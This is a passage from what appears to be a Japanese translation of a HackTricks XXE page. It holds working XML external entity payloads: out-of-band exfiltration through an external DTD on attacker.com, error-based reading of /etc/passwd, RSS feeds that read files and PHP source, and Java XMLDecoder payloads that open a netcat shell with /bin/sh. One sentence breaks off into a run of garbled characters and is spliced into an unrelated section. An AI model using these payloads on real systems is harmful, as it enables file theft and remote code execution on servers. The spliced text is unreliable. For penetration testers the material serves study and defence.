<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
しかし、このリクエストは内部サーバーエラーを引き起こし、具体的にはマークアップ宣言に問題があると言及しています。
```json
{"status":500,"error":"Internal Server Error","message":"Error systemId: http://redacted.burpcollaborator.net/?xxe_test; The markup declarations contained or pointed to by the document type declaration must be well-formed."}
```
エラーが発生したにもかかわらず、Burp Collaborator にヒットが記録され、外部エンティティとのある程度のやり取りがあったことが示されます。

帯域外データの流出
データを流出させるために、修正されたリクエストが送信されます：
```
------WebKitFormBoundaryqBdAsEtYaBjTArl3
Content-Disposition: form-data; name="file"; filename="xxe.xliff"
Content-Type: application/x-xliff+xml

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE XXE [
<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd"> %remote; ]>
<xliff srcLang="en" trgLang="ms-MY" version="2.0"></xliff>
------WebKitFormBoundaryqBdAsEtYaBjTArl3--
```
このアプローチにより、User AgentがJava 1.8の使用を示していることが明らかになります。このJavaのバージョンの注目すべき制限事項は、Out of Bandテクニックを使用して、/etc/passwdなどの改行文字を含むファイルを取得できないことです。

エラーベースのデータエクスフィルトレーション
この制限を克服するために、エラーベースのアプローチが採用されます。次のようにDTDファイルが構造化され、ターゲットファイルからデータを含むエラーがトリガーされます：
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/'>">
%foo;
%xxe;
```
サーバーはエラーで応答し、重要なのは存在しないファイルを反映しており、サーバーが指定されたファイルにアクセスしようとしていることを示しています：
```javascript
{"status":500,"error":"Internal Server Error","message":"IO error.\nReason: /nofile (No such file or directory)"}
```
エラーメッセージにファイルの内容を含めるために、DTDファイルを調整します:
```xml
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % foo "<!ENTITY &#37; xxe SYSTEM 'file:///nofile/%data;'>">
%foo;
%xxe;
```
この変更により、ファイルの内容が正常に外部に流出し、HTTP経由で送信されたエラー出力に反映されます。これは、感​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​​
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "http://<AttackIP>/rssXXE" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>XXE Test Blog</title>
<link>http://example.com/</link>
<description>XXE Test Blog</description>
<lastBuildDate>Mon, 02 Feb 2015 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>Test Post</description>
<author>author@example.com</author>
<pubDate>Mon, 02 Feb 2015 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### ファイルの読み取り
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
### ソースコードを読む

PHPのbase64フィルターを使用する
```markup
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE title [ <!ELEMENT title ANY >
<!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=file:///challenge/web-serveur/ch29/index.php" >]>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>The Blog</title>
<link>http://example.com/</link>
<description>A blog about things</description>
<lastBuildDate>Mon, 03 Feb 2014 00:00:00 -0000</lastBuildDate>
<item>
<title>&xxe;</title>
<link>http://example.com</link>
<description>a post</description>
<author>author@example.com</author>
<pubDate>Mon, 03 Feb 2014 00:00:00 -0000</pubDate>
</item>
</channel>
</rss>
```
## Java XMLDecoder XEE to RCE

XMLDecoderは、XMLメッセージに基づいてオブジェクトを作成するJavaクラスです。悪意のあるユーザーがアプリケーションに任意のデータを使用させて**readObject**メソッドを呼び出すことができれば、サーバーでコードの実行権限を瞬時に取得します。

### Runtime().exec()を使用
```markup
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<object class="java.lang.Runtime" method="getRuntime">
<void method="exec">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
</void>
</object>
</java>
```
### ProcessBuilder

### ProcessBuilder
```markup
<?xml version="1.0" encoding="UTF-8"?>
<java version="1.7.0_21" class="java.beans.XMLDecoder">
<void class="java.lang.ProcessBuilder">
<array class="java.lang.String" length="6">
<void index="0">
<string>/usr/bin/nc</string>
</void>
<void index="1">
<string>-l</string>
</void>
<void index="2">
<string>-p</string>
</void>
<void index="3">
<string>9999</string>
</void>
<void index="4">
<string>-e</string>
</void>
<void index="5">
<string>/bin/sh</string>
</void>
</array>
<void method="start" id="process">
</void>
</void>
</java>
```
## ツール

{% embed url="https://github.com/luisfontes19/xxexploiter" %}

## その他のリソース

[https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf](https://media.blackhat.com/eu-13/briefings/Osipov/bh-eu-13-XML-data-osipov-slides.pdf)\
[https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html](https://web-in-security.blogspot.com/2016/03/xxe-cheat-sheet.html)\
独自の外部DTDを使用してHTTP経由で情報を抽出する：[https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/](https://ysx.me.uk/from-rss-to-xxe-feed-parsing-on-hootsuite/)\
[https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XXE%20injection)\
[https://gist.github.com/staaldraad/01415b990939494879b4](https://gist.github.com/staaldraad/01415b990939494879b4)\
[https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9](https://medium.com/@onehackman/exploiting-xml-external-entity-xxe-injections-b0e3eac388f9)\
[https://portswigger.net/web-security/xxe](https://portswigger.net/web-security/xxe)\
[https://gosecure.github.io/xxe-workshop/#7](https://gosecure.github.io/xxe-workshop/#7)

<details>

<summary><strong>ゼロからヒーローまでのAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>！</strong></summary>

HackTricksをサポートする他の方法：

* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksスウォッグ**](https://peass.creator-spring.com)を手に入れる
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見つける
* **💬 [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)で私を**フォロー**してください。
* **HackTricks**と[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出して、あなたのハッキングトリックを共有してください。

</details>
